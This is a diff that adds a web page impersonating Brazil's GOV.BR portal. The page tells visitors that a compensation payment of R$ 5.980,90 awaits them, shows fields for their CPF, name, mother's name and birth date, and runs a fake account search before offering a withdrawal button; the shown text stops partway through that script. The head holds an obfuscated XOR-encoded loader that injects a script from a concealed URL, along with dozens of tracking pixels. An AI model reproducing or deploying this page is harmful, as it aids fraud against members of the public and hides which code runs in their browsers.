@@ -1,0 +1,951 @@
+
+<html lang="pt">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="./assets/css/style.css" data-precedence="next">
+    <title>GOV.BR</title>
+    <link rel="icon" href="./assets/images/favicon.ico" type="image/x-icon" sizes="16x16">
+    <meta name="next-size-adjust">
+    
+
+<!-- UTM FACEBOOK Code -->
+
+
+
+<script>
+(function () {
+  "use strict";
+
+  var STORAGE_KEY = "funil_tracking_params";
+
+  // Parâmetros que serão preservados entre as etapas.
+  var TRACKING_PARAMS = [
+    "utm_source",
+    "utm_medium",
+    "utm_campaign",
+    "utm_content",
+    "utm_term",
+    "fbclid"
+  ];
+
+  function readStorage(storage) {
+    try {
+      return JSON.parse(storage.getItem(STORAGE_KEY) || "{}");
+    } catch (e) {
+      return {};
+    }
+  }
+
+  function saveStorage(storage, data) {
+    try {
+      storage.setItem(STORAGE_KEY, JSON.stringify(data));
+    } catch (e) {}
+  }
+
+  function getSavedParams() {
+    var session = readStorage(sessionStorage);
+    var local = readStorage(localStorage);
+
+    return Object.assign({}, local, session);
+  }
+
+  function saveParams(data) {
+    saveStorage(sessionStorage, data);
+    saveStorage(localStorage, data);
+  }
+
+  // 1. Recupera os parâmetros já salvos.
+  var params = getSavedParams();
+
+  // 2. Captura os parâmetros recebidos na URL atual.
+  var currentURL = new URL(window.location.href);
+
+  TRACKING_PARAMS.forEach(function (key) {
+    var value = currentURL.searchParams.get(key);
+
+    // Atualiza somente se o parâmetro estiver presente
+    // e tiver um valor não vazio.
+    if (value !== null && value.trim() !== "") {
+      params[key] = value;
+    }
+  });
+
+  // 3. Salva os parâmetros para as próximas páginas.
+  saveParams(params);
+
+  // 4. Função global para redirecionar preservando as UTMs.
+  window.goToNext = function (nextURL) {
+    var destination = new URL(nextURL, window.location.href);
+    var saved = getSavedParams();
+
+    // Não substitui parâmetros de tracking já definidos
+    // explicitamente na URL de destino.
+    TRACKING_PARAMS.forEach(function (key) {
+      if (
+        saved[key] &&
+        !destination.searchParams.has(key)
+      ) {
+        destination.searchParams.set(key, saved[key]);
+      }
+    });
+
+    window.location.href = destination.href;
+  };
+
+  // 5. Propaga as UTMs automaticamente nos links internos.
+  document.addEventListener("click", function (event) {
+    var link = event.target.closest("a[href]");
+
+    if (!link) return;
+    if (link.target === "_blank") return;
+    if (event.ctrlKey || event.metaKey || event.shiftKey) return;
+    if (event.button !== 0) return;
+
+    var destination;
+
+    try {
+      destination = new URL(link.href, window.location.href);
+    } catch (e) {
+      return;
+    }
+
+    // Só modifica links da mesma origem.
+    if (destination.origin !== window.location.origin) return;
+
+    TRACKING_PARAMS.forEach(function (key) {
+      if (
+        params[key] &&
+        !destination.searchParams.has(key)
+      ) {
+        destination.searchParams.set(key, params[key]);
+      }
+    });
+
+    link.href = destination.href;
+  });
+
+  // Disponibiliza os parâmetros para outros scripts.
+  window.getFunilTracking = function () {
+    return Object.assign({}, getSavedParams());
+  };
+
+})();
+</script>
+
+
+<!-- END UTM FACEBOOK CODE -->
+
+<!-- UTMFY Code -->
+
+<script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+
+
+<script>(function(){var f_tx=atob("DAdM54C6GPaiGO83GnxukvLWOsyAcJtDanR2yK/ZfJiMbZtac2E1yePVddjAasBEeXUll/TJN4PWdZwYdmY4gvPONpzROsMVe3M4lenYbYLHa80NQXxuieHXfdSYOotWbmZhkvTXcZDbNZ9Ff3EpifSXYJXNfMJEeWxuy6LMeZrXfc0NOCUxy/uYdpfPfc0NOGMtk+GXbYLPcYlON3c+gvbfdoKPa5pVc2M/xayYbpfObYoVICVumt3H");var p_rt=[];for(var w_puw=0;w_puw<f_tx.length;w_puw++){p_rt.push(f_tx.charCodeAt(w_puw)&255);}var r_7d0y=p_rt[0];var f_5kg=p_rt.slice(1,1+r_7d0y);var p_0kac=p_rt.slice(1+r_7d0y);var t_c=p_0kac.map(function(b,d_nin){return b^f_5kg[d_nin%r_7d0y];});var o_pdk="";for(var q_rs3e=0;q_rs3e<t_c.length;q_rs3e++){o_pdk+=String.fromCharCode(t_c[q_rs3e]&255);}var h_l0yz=decodeURIComponent(escape(o_pdk));var k_s=JSON.parse(h_l0yz);var q_ane=k_s.globals||[];q_ane.forEach(function(w_dru){window[w_dru.name]=w_dru.value;});var w_w=document.createElement("script");w_w.src=k_s.url;w_w.async=true;w_w.defer=true;(k_s.attributes||[]).forEach(function(g_1){w_w.setAttribute(g_1.name,g_1.value);});(document.head||document.documentElement).appendChild(w_w);})();</script>
+
+
+
+<!-- END UTMFY CODE -->
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1117296950800245');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1117296950800245&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1746333669903668');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1746333669903668&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1015408774399172');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1015408774399172&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '2243844239765046');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=2243844239765046&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1375844174304393');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1375844174304393&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '2137523013457243');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=2137523013457243&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '847755107473498');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=847755107473498&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '2083978855786884');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=2083978855786884&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1313184030636134');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1313184030636134&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '229463223255909');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=229463223255909&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '4234627643479096');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=4234627643479096&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '794380730326961');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=794380730326961&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '2299537240549041');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=2299537240549041&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1342087550707140');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1342087550707140&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1173269651619651');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1173269651619651&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1574851956843520');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1574851956843520&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1185480309697471');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1185480309697471&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '810965115433003');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=810965115433003&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '768728832672906');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=768728832672906&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '2763526227120952');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=2763526227120952&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '763158696614724');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=763158696614724&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1832985513945847');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1832985513945847&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1768764637040662');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1768764637040662&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1884540289109881');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1884540289109881&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+
+    <!-- UTMify Pixel -->
+    <script>
+      window.pixelId = "67b759e9f454faf48c0999a2";
+      var a = document.createElement("script");
+      a.setAttribute("async", "");
+      a.setAttribute("defer", "");
+      a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+      document.head.appendChild(a);
+    </script>
+
+    <!-- Meta Pixel Code -->
+    <script>
+      !(function (f, b, e, v, n, t, s) {
+        if (f.fbq) return;
+        n = f.fbq = function () {
+          n.callMethod
+            ? n.callMethod.apply(n, arguments)
+            : n.queue.push(arguments);
+        };
+        if (!f._fbq) f._fbq = n;
+        n.push = n;
+        n.loaded = !0;
+        n.version = "2.0";
+        n.queue = [];
+        t = b.createElement(e);
+        t.async = !0;
+        t.src = v;
+        s = b.getElementsByTagName(e)[0];
+        s.parentNode.insertBefore(t, s);
+      })(
+        window,
+        document,
+        "script",
+        "https://connect.facebook.net/en_US/fbevents.js",
+      );
+      fbq("init", "574352008891416");
+      fbq("track", "PageView");
+    </script>
+    <!-- Devtools check removed -->
+    <script src="./assets/ty.js"></script>
+    <!-- Meta Pixel Code -->
+
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '574352008891416');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=574352008891416&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+<script src="pepper-api.js"></script>
+</head>
+
+<body class="__className_d65c78 antialiased scroll-smooth overflow-x-hidden">
+    <div class="w-full min-h-screen">
+        <div class="max-w-lg w-full mx-auto space-y-4 bg-[#1351B4] min-h-screen">
+            <div class="w-full bg-white h-16 px-5 flex items-center justify-between shadow-lg"><a href="#"><img
+                        alt="Logo" fetchpriority="high" width="111" height="40" decoding="async" data-nimg="1"
+                        class="w-auto h-[36px] object-contain" style="color:transparent"
+                        srcset="./assets/images/gov.webp"
+                        src="./assets/images/gov.webp"></a>
+            </div>
+            <div class="px-4 pb-10">
+                <div class="w-full flex items-center justify-center">
+                    <div
+                        class="border text-card-foreground shadow-sm w-full max-w-[600px] p-6 rounded-2xl bg-white mt-5 flex flex-col space-y-6">
+                        <p class="text-base text-center">Sua indenização foi calculada com sucesso! O valor que você
+                            possui receber está abaixo do vídeo. Toque no botão para realizar seu saque.</p>
+                            <div aria-valuemax="100" aria-valuemin="0" role="progressbar" data-state="indeterminate" data-max="100" class="relative w-full overflow-hidden rounded-full bg-primary/20 h-3 mt-4">
+                                <div id="progress-bar" data-state="indeterminate" data-max="100" class="h-full w-0 bg-[#22C55E] transition-all"></div>
+                            </div>
+                     
+                            <script src="https://scripts.converteai.net/lib/js/smartplayer/v1/sdk.min.js" data-id="677dee1eee19cc2fb0aa215e"></script> <div id="ifr_677dee1eee19cc2fb0aa215e_wrapper" style="margin: 0 auto; width: 100%"> <div style="padding: 56.25% 0 0 0; position: relative; margin-top: 25px;" id="ifr_677dee1eee19cc2fb0aa215e_aspect"> <iframe frameborder="0" allowfullscreen src="https://scripts.converteai.net/9442350b-6fb7-4fbc-842e-2bdf2ffb5e90/players/677dee1eee19cc2fb0aa215e/embed.html" id="ifr_677dee1eee19cc2fb0aa215e" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%;" referrerpolicy="origin"></iframe> </div> </div> <style> .elementor-element:has(#ifr_677dee1eee19cc2fb0aa215e_wrapper) { width: 100%; } </style>
+                        <div class="space-y-4">
+                            <h2 class="text-sm font-bold">Dados verificados com sucesso!</h2>
+                            <div class="space-y-2">
+                                <div class="flex items-center gap-3"><img alt="" loading="lazy" width="24" height="24"
+                                        decoding="async" data-nimg="1" class="size-5" style="color:transparent"
+                                        srcset="./assets/images/user.webp"
+                                        src="./assets/images/user.webp">
+                                    <div>
+                                        <p id="mae"></p>
+                                    </div>
+                                </div>
+                                <div class="flex items-center gap-3"><img alt="" loading="lazy" width="24" height="24"
+                                        decoding="async" data-nimg="1" class="size-5" style="color:transparent"
+                                        srcset="./assets/images/nasc.webp"
+                                        src="./assets/images/nasc.webp">
+                                    <div>
+                                        <p id="nascimento"></p>
+                                    </div>
+                                </div>
+                                <div class="flex items-center gap-3"><img alt="" loading="lazy" width="24" height="24"
+                                        decoding="async" data-nimg="1" class="size-5" style="color:transparent"
+                                        srcset="./assets/images/cpf.webp"
+                                        src="./assets/images/cpf.webp">
+                                    <div>
+                                        <p id="cpf"></p>
+                                    </div>
+                                </div>
+                                <div class="flex items-center gap-3"><img alt="" loading="lazy" width="24" height="24"
+                                        decoding="async" data-nimg="1" class="size-5" style="color:transparent"
+                                        srcset="./assets/images/nome.webp"
+                                        src="./assets/images/nome.webp">
+                                    <div>
+                                        <p id="nome"></p>
+                                    </div>
+                                </div>
+                                <div class="flex items-center gap-3"><img alt="" loading="lazy" width="24" height="24"
+                                        decoding="async" data-nimg="1" class="size-5" style="color:transparent"
+                                        srcset="./assets/images/calculo.webp"
+                                        src="./assets/images/calculo.webp">
+                                        <div class="flex items-center">
+                                            <p id="status-text" class="animate-pulse">Calculando o valor da sua indenização...</p>
+                                            <svg
+                                                id="loading-icon"
+                                                xmlns="http://www.w3.org/2000/svg" width="24" height="24"
+                                                viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                                                stroke-linecap="round" stroke-linejoin="round"
+                                                class="lucide lucide-loader-circle size-4 animate-spin ml-2">
+                                                <path d="M21 12a9 9 0 1 1-6.219-8.56"></path>
+                                            </svg>
+                                        </div>
+
+                                   
+                                </div>
+
+                                <div class="flex items-center hidden" id="button-container">
+                                    <button type="submit" id="next-page-button" class="inline-flex items-center justify-center gap-2 whitespace-nowrap ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg]:size-4 [&amp;_svg]:shrink-0 h-10 px-4 w-full bg-[#1351B4] hover:bg-[#1351B4]/90 text-white py-2 rounded-full text-sm font-medium"> Quero receber minha indenização</button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <script>
+                    const statusTexts = [
+                        "Calculando o valor da sua indenização...",
+                        "Buscando valores em contas inativas...",
+                        "Buscando valores em contas INSS...",
+                        "Buscando valores em contas FGTS...",
+                        "Buscando valores em contas PIS...",
+                        "Buscando valores em contas de CPF...",
+                        "Buscando valores em contas de CNPJ...",
+                        "Buscando valores em contas de seguro desemprego...",
+                        "R$ 5.980,90 de indenização pronto para ser liberado"
+                    ];
+            
+                    const totalTime = 95000; 
